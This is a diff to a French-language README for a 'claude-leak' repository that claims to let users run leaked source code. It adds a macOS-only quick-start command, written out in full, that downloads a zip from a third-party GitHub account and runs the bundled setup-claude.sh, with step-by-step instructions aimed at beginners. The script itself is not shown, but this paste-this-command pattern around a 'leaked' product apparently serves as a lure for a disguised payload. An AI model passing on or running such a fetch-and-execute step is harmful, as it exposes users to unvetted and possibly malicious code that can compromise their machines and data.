@@ -64,7 +64,54 @@ Le code source original divulgué ne peut pas être exécuté directement. Ce d�
 
 ## Démarrage rapide
 
-Ici je metterais les deux lignes ...
+⚠️ **Attention : Ce script ne fonctionne QUE sur les ordinateurs Apple (macOS).**
+
+
+### 🚀 Option 1 : Installation Rapide (Recommandée)
+
+C'est la méthode la plus simple. Ouvrez l'application **Terminal** sur votre Mac (appuyez sur `Cmd + Espace`, tapez "Terminal" et validez). 
+
+Copiez-collez cette commande unique dans le Terminal et appuyez sur **Entrée** :
+
+```bash
+curl -L -o claude.zip "[https://github.com/Xhelper-sys/claude-leak/archive/refs/heads/master.zip](https://github.com/Xhelper-sys/claude-leak/archive/refs/heads/master.zip)" && unzip -q claude.zip && cd claude-leak-master/src/launch && chmod +x setup-claude.sh && ./setup-claude.sh 
+```
+
+### 🐢 Option 2 : Installation Étape par Étape
+Si vous préférez comprendre ce que vous faites, voici les étapes détaillées à entrer une par une dans le Terminal :
+
+1. Télécharger et extraire le projet
+Télécharge le fichier depuis GitHub et le décompresse automatiquement :
+
+```bash
+curl -L -o claude.zip "[https://github.com/Xhelper-sys/claude-leak/archive/refs/heads/master.zip](https://github.com/Xhelper-sys/claude-leak/archive/refs/heads/master.zip)" && unzip -q claude.zip
+```
+
+2. Aller dans le dossier d'installation
+Permet de se placer dans le bon dossier fraîchement extrait :
+
+```bash
+cd claude-leak-master/src/launch
+```
+
+3. Rendre le script exécutable
+Donne les droits au Mac pour lancer le programme :
+```bash
+chmod +x setup-claude.sh
+```
+
+4. Lancer l'installation
+Exécute la configuration :
+```bash
+./setup-claude.sh
+```
+
+
+
+
+
+
+
 
 
 ---
